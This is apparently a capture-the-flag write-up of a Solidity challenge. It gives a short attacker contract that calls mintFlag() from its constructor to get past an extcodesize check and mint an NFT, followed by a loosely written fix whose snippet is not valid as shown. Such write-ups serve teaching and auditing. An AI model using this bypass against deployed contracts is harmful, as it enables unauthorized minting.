# Challenge Overview
- Name: Challenge 3
- Category: Smart Contract Exploitation
- Objective: Mint the NFT associated with Challenge 3.

# Contract Code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./INFTFlags.sol";

contract Challenge3 {
    address public nftContract;

    constructor(address _nftContract) {
        nftContract = _nftContract;
    }

    function mintFlag() public {
        require(msg.sender != tx.origin, "Not allowed");

        uint256 x;
        assembly {
            x := extcodesize(caller())
        }

        require(x == 0, "Size not zero");

        INFTFlags(nftContract).mint(tx.origin, 3);
    }
}
```

# Vulnerability Analysis

The mintFlag function has two checks:
1.	Ensures the caller `msg.sender` is not the transaction origin (tx.origin).
2.	Uses assembly to check the `extcodesize(caller())`, ensuring that the caller is not a contract with deployed bytecode.

The intention is to restrict direct EOA calls while also blocking any contract calls. However, the check is bypassable due to the fact that contracts do not have bytecode during their constructor execution phase. Therefore, a contract calling this function from its constructor will pass both checks.

# Exploit Execution

To exploit this vulnerability, we write an attacker contract that calls the mintFlag function in its constructor. During the constructor execution, the contract has no bytecode, so the extcodesize check returns 0, bypassing the restriction.

```solidity
interface IChallenge3 {
    function mintFlag() external;
}

contract Exploit {
    IChallenge3 public target;

    constructor(address _target) {
        target = IChallenge3(_target);
        target.mintFlag();
    }
}
```


## Execution Steps:
1.	Deploy the Exploit contract with the address of the Challenge3 contract.
2.	During the deployment, the constructor calls `mintFlag()` before the contract has any bytecode.
3.	The extcodesize check returns 0, bypassing the restriction.
4.	The NFT is successfully minted.

# Result & Impact

This exploit allows unauthorized users to mint NFTs without the intended restrictions. The lack of a robust access control mechanism can lead to unintended distribution of NFTs, compromising the security and exclusivity of the contract.

# Fix Recommendation

To mitigate this issue:
1.	Use the OpenZeppelin Context utility and validate the caller more securely.
2.	Avoid relying solely on extcodesize for contract detection.
3.	Implement access control mechanisms like whitelisting authorized addresses or checking against a trusted registry.

```solidity
require(msg.sender == tx.origin && !isContract(msg.sender), "Not allowed");

function isContract(address account) internal view returns (bool) {
    uint256 size;
    assembly {
        size := extcodesize(account)
    }
    return size > 0;
}
```

This fix ensures that both EOAs and contract-based attacks are effectively restricted.